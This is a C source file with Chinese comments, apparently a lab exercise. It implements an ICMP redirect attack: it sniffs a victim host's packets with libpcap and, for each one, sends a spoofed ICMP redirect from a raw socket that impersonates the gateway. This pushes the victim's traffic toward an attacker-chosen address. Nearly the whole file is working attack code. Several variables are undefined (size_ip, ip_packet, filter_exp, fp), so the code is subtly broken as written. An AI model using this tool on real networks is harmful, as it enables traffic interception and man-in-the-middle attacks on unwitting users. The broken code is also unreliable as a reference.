
/**
 * ICMP重定向
 * 步骤：1.嗅探，2.重定向
 * 
 * 嗅探器
 * 1. 确定设备接口，如eth0 调用pcap_lookupdev
 * 2. 初始化嗅探器，pcap_open_live
 * 3. 过滤规则设定 pcap_compile , pcap_setfilter 
 * 4. 嗅探，pcap_next (只读一 次) , pcap_loop (循环处理)，使用回调函数，分析数据包
 * 5. 结束，pcap_close 
 * 
 * 重定向
 * 使用原始套接字 raw socket
 * 构建IP头、icmp头、icmp数据
 * 
 */
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

#define MAX 1024
/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6

const unsigned char *Vic_IP = "192.168.72.129";//攻击对象的ip
const unsigned char *Ori_Gw_IP = "192.168.72.2";//源网关ip
const unsigned char *Redic_IP = "192.168.72.128";//重定向ip

/* Ethernet header */
struct ethernet_header{
        u_int8_t  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
        u_int8_t  ether_shost[ETHER_ADDR_LEN];    /* source host address */
        u_int16_t ether_type;                     /* IP? ARP? RARP? etc */
};


/* IP header */
struct ip_header  
{  
#ifdef WORDS_BIGENDIAN  
  u_int8_t ip_version:4;  
  u_int8_t ip_header_length:4;  
#else  
  u_int8_t ip_header_length:4;  
  u_int8_t ip_version:4;  
#endif  
  u_int8_t ip_tos;  
  u_int16_t ip_length;  
  u_int16_t ip_id;  
  u_int16_t ip_off;  
  u_int8_t ip_ttl;  
  u_int8_t ip_protocol;  
  u_int16_t ip_checksum;  
  struct in_addr ip_source_address;  
  struct in_addr ip_destination_address;  
};  
//#define IP_HL(ip)               (((ip)->ip_vhl) & 0x0f)
//#define IP_V(ip)                (((ip)->ip_vhl) >> 4)

/* TCP header */
typedef u_int16_t tcp_seq;

struct tcp_header{
        u_int16_t th_sport;               /* source port */
        u_int16_t th_dport;               /* destination port */
        tcp_seq th_seq;                 /* sequence number */
        tcp_seq th_ack;                 /* acknowledgement number */
        u_int8_t  th_offx2;               /* data offset, rsvd */
#define TH_OFF(th)      (((th)->th_offx2 & 0xf0) >> 4)
        u_int8_t  th_flags;
        #define TH_FIN  0x01
        #define TH_SYN  0x02
        #define TH_RST  0x04
        #define TH_PUSH 0x08
        #define TH_ACK  0x10
        #define TH_URG  0x20
        #define TH_ECE  0x40
        #define TH_CWR  0x80
        #define TH_FLAGS        (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
        u_int16_t th_win;                 /* window */
        u_int16_t th_sum;                 /* checksum */
        u_int16_t th_urp;                 /* urgent pointer */
};

/*icmp 重定向报文头*/
struct icmp_header  
{  
  u_int8_t icmp_type;  
  u_int8_t icmp_code;  
  u_int16_t icmp_checksum;  
  struct in_addr icmp_gateway_addr;

  //u_int16_t icmp_identifier;  
  //u_int16_t icmp_sequence;  
};  


/*计算校验和*/  
u_int16_t checksum(u_int8_t *buf,int len)  
{  
    u_int32_t sum=0;  
    u_int16_t *cbuf;  
  
    cbuf=(u_int16_t *)buf;  
  
    while(len>1)
	{  
    	sum+=*cbuf++;  
    	len-=2;  
    }  
  
    if(len)  
        sum+=*(u_int8_t *)cbuf;  
  
        sum=(sum>>16)+(sum & 0xffff);  
        sum+=(sum>>16);  
  
        return ~sum;  
} 

/*重定向攻击*/
void icmpRedirect(int sockfd,const unsigned char * packet_data){
	struct ip_header *ip;
    	struct icmp_header *icmp;
    //设定好数据报：ip头，icmp头，icmp数据
	struct packet_struct
	{
		struct iphdr ip;
		struct icmphdr icmp;
		char datas[28];
    	}packet;

	//ip头 20字节
    packet.ip.version = 4;
    packet.ip.ihl = 5;
    packet.ip.tos = 0;  //服务类型
    packet.ip.tot_len = htons(56);  //host to short 56=20+8+28
    packet.ip.id = getpid();
    packet.ip.frag_off = 0;
    packet.ip.ttl = 255;
    packet.ip.protocol = IPPROTO_ICMP;
    packet.ip.check = 0;
    packet.ip.saddr = inet_addr(Ori_Gw_IP); //伪造网关发送ip报文
    packet.ip.daddr = inet_addr(Vic_IP);    //把重定向包发给受害者
    
    //icmp头 8字节
    packet.icmp.type = ICMP_REDIRECT;//5
    packet.icmp.code = ICMP_REDIR_HOST;//0
    packet.icmp.checksum = 0;
    packet.icmp.un.gateway = inet_addr(Redic_IP);
    struct sockaddr_in dest =  {
        .sin_family = AF_INET,
        .sin_addr = {
        .s_addr = inet_addr(Vic_IP)
        }
    };
    //将抓到的IP包的前28字节 ，作为icmp数据
    memcpy(packet.datas,(packet_data + SIZE_ETHERNET),28);
    packet.ip.check = checksum(&packet.ip,sizeof(packet.ip));
    packet.icmp.checksum = checksum(&packet.icmp,sizeof(packet.icmp)+28);
    
    //sendto用于非可靠连接的数据数据发送，如UDP， 接收数据用recvfrom  
    sendto(sockfd,&packet,56,0,(struct sockaddr *)&dest,sizeof(dest));
    printf("send icmp redirect\n");
}

/*解析数据包*/
void getPacket(u_int8_t * arg, const struct pcap_pkthdr * pkthdr, const u_int8_t * packet) 
{
    static int count = 1;   //计数
   	int sockfd,res;
    int one = 1;
    int *ptr_one = &one;

    /* 包头 */
	const struct ethernet_header *ethernet;  /* The ethernet header [1] */
	const struct ip_header *ip;              /* The IP header */
	const struct tcp_header *tcp;            /* The TCP header */
	const char *payload;                    /* Packet payload */

    int ipHeaderLen;
	int tcpHeaderLen;
	//int size_payload;

    printf("\nPacket number %d:\n", count++);
    printf("Packet length: %d\n", pkthdr->len);

    /* define ethernet header */
	ethernet = (struct ethernet_header*)(packet);

	/* define/compute ip header offset */   
	ip = (struct ip_header*)(packet + SIZE_ETHERNET); 
	ipHeaderLen = (ip->ip_header_length)*4;  //IP头长度的单位是4字节
	if (ipHeaderLen < 20) {
		printf("   * Invalid IP header length: %u bytes\n", size_ip);
		return;
	}

	
	// print source and destination IP addresses 
	printf("       From: %s\n", inet_ntoa(ip->ip_source_address)); 
	printf("         To: %s\n", inet_ntoa(ip->ip_destination_address));

	/*
	// determine protocol 	
	switch(ip->ip_protocol) {
		case IPPROTO_TCP:
			printf("   Protocol: TCP\n");
			break;
		case IPPROTO_UDP:
			printf("   Protocol: UDP\n");
			break;
		case IPPROTO_ICMP:
			printf("   Protocol: ICMP\n");
			break;
		case IPPROTO_IP:
			printf("   Protocol: IP\n");
			break;
		default:
			printf("   Protocol: unknown\n");
			break;
	}
   */
	/*//tcpHeaderLen = (struct tcp_header*)(packet + SIZE_ETHERNET+ipHeaderLen); 
	if(tcpHeaderLen<20)
	{
		printf("   * Invalid TCP header length: %u bytes\n", size_ip);
		return;
	}*/
//创建raw socket，手动填充icmp部分
	if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
        {
            printf("create sockfd error\n");
            exit(-1);
        }
	 //开启IP_HDRINCL选项，手动填充IP头
    res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));   
    if(res < 0)
    {
        printf("error--\n");
        exit(-3);
    }
    //重定向攻击
    icmpRedirect(sockfd,ip_packet);
    close(sockfd);
    return;
}

int main()
{
    char errBuf[PCAP_ERRBUF_SIZE], * devStr;
    struct bpf_program filter;
    char filterstr[50]={0};
    
    /* get a device */
    devStr = pcap_lookupdev(errBuf);

    if(devStr)
        printf("success: device: %s\n", devStr);
    else
    {
        printf("error: %s\n", errBuf);
        exit(1);
    }

    /*捕获数据
    * 参数：
    * 设备名称，最大捕获量(字节)，是否置于混杂模式（混杂即捕获设备收发的所有数据），超时时间（0表示没有超时等待），错误信息
    */
    pcap_t * handle = pcap_open_live(devStr, 65535, 1, 0, errBuf);    

    //编译filter
    //参数：filter过滤器指针;filterstr过滤表达式; 1:表达式是否被优化;0：应用此过滤器的掩码
    sprintf(filterstr,"src host %s",Vic_IP);        //只嗅探目标IP的数据报
    if (pcap_compile(handle, &filter, filterstr, 1, 0) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		 return 0;
	 }
     //启用过滤器
     if (pcap_setfilter(handle, &filter) == -1) {
         fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
         return 0;
     }


    //循环抓包
    //-1表示循环次数，getPacket是回调函数，用于解析数据包，最后参数一般置为null
    pcap_loop(handle, -1, getPacket, NULL);
    
    pcap_freecode(&fp);
    pcap_close(handle);
    return 0;
}
